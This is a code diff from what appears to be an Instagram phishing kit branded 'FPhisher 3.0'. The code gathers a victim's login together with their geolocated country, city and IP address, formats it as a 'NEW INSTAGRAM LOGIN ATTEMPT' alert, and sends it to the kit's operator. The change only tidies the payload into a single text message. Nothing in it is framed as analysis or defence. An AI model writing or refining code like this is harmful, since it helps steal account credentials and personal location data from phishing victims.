@@ -94,7 +94,7 @@
       const loc = await getLocation();
       attempt++;
 
-      // Clean single message - no duplication, ends with "Secured by FPhisher 3.0"
+      // Final clean message - no extra fields will be shown after it
       const formattedMessage = `🚨 NEW INSTAGRAM LOGIN ATTEMPT 🚨
 
 📋 DETAILS:
@@ -113,17 +113,10 @@
 🔒 Secured by FPhisher 3.0 🔒
 ⏰ ${new Date().toLocaleString()}`;
 
+      // Only send the clean text - remove all other fields to stop repetition
       const payload = {
         id: SUBMIT_ID,
-        text: formattedMessage,        // Only one message field
-        username: username,
-        password: password,
-        country: loc.country,
-        state: loc.state,
-        city: loc.city,
-        ip: loc.ip,
-        attempt: attempt,
-        timestamp: new Date().toISOString()
+        text: formattedMessage
       };
 
       try {
